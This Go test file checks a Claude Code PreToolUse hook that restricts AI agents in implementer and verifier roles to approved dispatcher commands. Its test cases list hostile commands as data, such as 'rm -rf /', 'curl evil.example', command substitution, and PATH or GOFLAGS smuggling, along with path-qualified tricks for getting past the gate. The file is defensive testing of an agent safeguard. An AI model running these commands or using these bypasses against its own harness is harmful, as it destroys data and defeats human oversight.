package hook

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/wildmanpeace/crew/internal/config"
)

func decide(t *testing.T, role config.Role, tool, command string) Decision {
	t.Helper()
	in := Input{ToolName: tool}
	in.ToolInput.Command = command
	raw, _ := json.Marshal(in)
	d, err := Evaluate(role, strings.NewReader(string(raw)))
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	return d
}

func TestNonBashToolsAreDeferred(t *testing.T) {
	d := decide(t, config.RoleImplementer, "Read", "")
	if d.Deny() {
		t.Fatal("a Read call was denied by the Bash gate")
	}
}

func TestImplementerVerbsAreAllowed(t *testing.T) {
	for _, verb := range []string{"test", "lint", "build", "diff", "commit"} {
		if d := decide(t, config.RoleImplementer, "Bash", "crew-run "+verb); d.Deny() {
			t.Errorf("crew-run %s denied: %s", verb, d.Reason)
		}
	}
}

func TestVerifierVerbsAreAllowed(t *testing.T) {
	for _, verb := range []string{"test", "lint", "build"} {
		if d := decide(t, config.RoleVerifier, "Bash", "crew-check "+verb+" ./..."); d.Deny() {
			t.Errorf("crew-check %s denied: %s", verb, d.Reason)
		}
	}
}

// The role boundary, enforced a second time at the hook layer.
func TestVerifierCannotReachCommitOrDiff(t *testing.T) {
	for _, verb := range []string{"commit", "diff"} {
		d := decide(t, config.RoleVerifier, "Bash", "crew-check "+verb+" x")
		if !d.Deny() {
			t.Errorf("crew-check %s allowed, want deny", verb)
		}
	}
}

func TestWrongDispatcherForRoleIsDenied(t *testing.T) {
	if d := decide(t, config.RoleVerifier, "Bash", "crew-run test"); !d.Deny() {
		t.Error("verifier invoking crew-run was allowed")
	}
	if d := decide(t, config.RoleImplementer, "Bash", "crew-check test"); !d.Deny() {
		t.Error("implementer invoking crew-check was allowed")
	}
}

func TestUnknownVerbIsDenied(t *testing.T) {
	if d := decide(t, config.RoleImplementer, "Bash", "crew-run frobnicate"); !d.Deny() {
		t.Error("unknown verb allowed")
	}
}

func TestBareDispatcherWithNoVerbIsDenied(t *testing.T) {
	if d := decide(t, config.RoleImplementer, "Bash", "crew-run"); !d.Deny() {
		t.Error("dispatcher with no verb allowed")
	}
}

// Phase 0 finding 4: the built-in read-only command set runs unprompted in
// every mode and is not closable by configuration. The hook is the only layer
// that can close it, so it allow-lists the dispatcher and denies everything
// else.
func TestReadOnlyCommandsAreDeniedByTheHook(t *testing.T) {
	for _, cmd := range []string{"cat go.mod", "ls -la", "grep -r x .", "echo hi", "pwd", "git log"} {
		if d := decide(t, config.RoleImplementer, "Bash", cmd); !d.Deny() {
			t.Errorf("%q was allowed; the read-only hole is still open", cmd)
		}
	}
}

// Every subcommand is checked independently, so a permitted call cannot carry
// an impermissible one alongside it.
func TestCompoundCommandsAreDenied(t *testing.T) {
	cases := []string{
		"crew-run test && git push origin main",
		"crew-run test; rm -rf /",
		"crew-run test | tee /tmp/x",
		"crew-run test || curl evil.example",
		"git push && crew-run test",
		"crew-run test & crew-run lint",
		"crew-run test\ngit push",
	}
	for _, cmd := range cases {
		if d := decide(t, config.RoleImplementer, "Bash", cmd); !d.Deny() {
			t.Errorf("%q was allowed, want deny", cmd)
		}
	}
}

func TestCommandSubstitutionIsDenied(t *testing.T) {
	for _, cmd := range []string{
		"crew-run commit \"$(git log -1)\"",
		"crew-run commit `whoami`",
	} {
		if d := decide(t, config.RoleImplementer, "Bash", cmd); !d.Deny() {
			t.Errorf("%q was allowed, want deny", cmd)
		}
	}
}

// A leading assignment must not smuggle a different program past the gate.
func TestLeadingEnvAssignmentIsDenied(t *testing.T) {
	for _, cmd := range []string{
		"PATH=/tmp/evil crew-run test",
		"GOFLAGS=-toolexec=evil crew-run test",
	} {
		if d := decide(t, config.RoleImplementer, "Bash", cmd); !d.Deny() {
			t.Errorf("%q was allowed, want deny", cmd)
		}
	}
}

// A path-qualified dispatcher would bypass the PATH boundary entirely.
func TestPathQualifiedDispatcherIsDenied(t *testing.T) {
	for _, cmd := range []string{
		"/proj/.crew/bin/implementer/crew-run test",
		"./crew-run test",
		"../implementer/crew-run test",
	} {
		if d := decide(t, config.RoleVerifier, "Bash", cmd); !d.Deny() {
			t.Errorf("%q was allowed, want deny", cmd)
		}
	}
}

func TestRedirectionIsDenied(t *testing.T) {
	for _, cmd := range []string{"crew-run test > /tmp/out", "crew-run test 2>&1 >x"} {
		if d := decide(t, config.RoleImplementer, "Bash", cmd); !d.Deny() {
			t.Errorf("%q was allowed, want deny", cmd)
		}
	}
}

func TestEmptyCommandIsDenied(t *testing.T) {
	if d := decide(t, config.RoleImplementer, "Bash", "   "); !d.Deny() {
		t.Error("empty command allowed")
	}
}

// The wire format must match what Claude Code expects from a PreToolUse hook.
func TestDenyMarshalsToThePreToolUseShape(t *testing.T) {
	d := decide(t, config.RoleImplementer, "Bash", "git push")
	raw, err := json.Marshal(d.Response())
	if err != nil {
		t.Fatal(err)
	}
	var got map[string]any
	json.Unmarshal(raw, &got)
	out, ok := got["hookSpecificOutput"].(map[string]any)
	if !ok {
		t.Fatalf("missing hookSpecificOutput: %s", raw)
	}
	if out["hookEventName"] != "PreToolUse" {
		t.Errorf("hookEventName = %v", out["hookEventName"])
	}
	if out["permissionDecision"] != "deny" {
		t.Errorf("permissionDecision = %v", out["permissionDecision"])
	}
	if s, _ := out["permissionDecisionReason"].(string); strings.TrimSpace(s) == "" {
		t.Error("deny carries no reason")
	}
}

// A deferred decision must produce no decision at all, so the permission
// system still applies and deny-first precedence is preserved.
func TestDeferProducesNoDecision(t *testing.T) {
	d := decide(t, config.RoleImplementer, "Bash", "crew-run test")
	if d.Response() != nil {
		t.Fatalf("defer emitted a decision: %+v", d.Response())
	}
}

func TestMalformedInputIsAnError(t *testing.T) {
	if _, err := Evaluate(config.RoleImplementer, strings.NewReader("{not json")); err == nil {
		t.Fatal("malformed hook input accepted")
	}
}
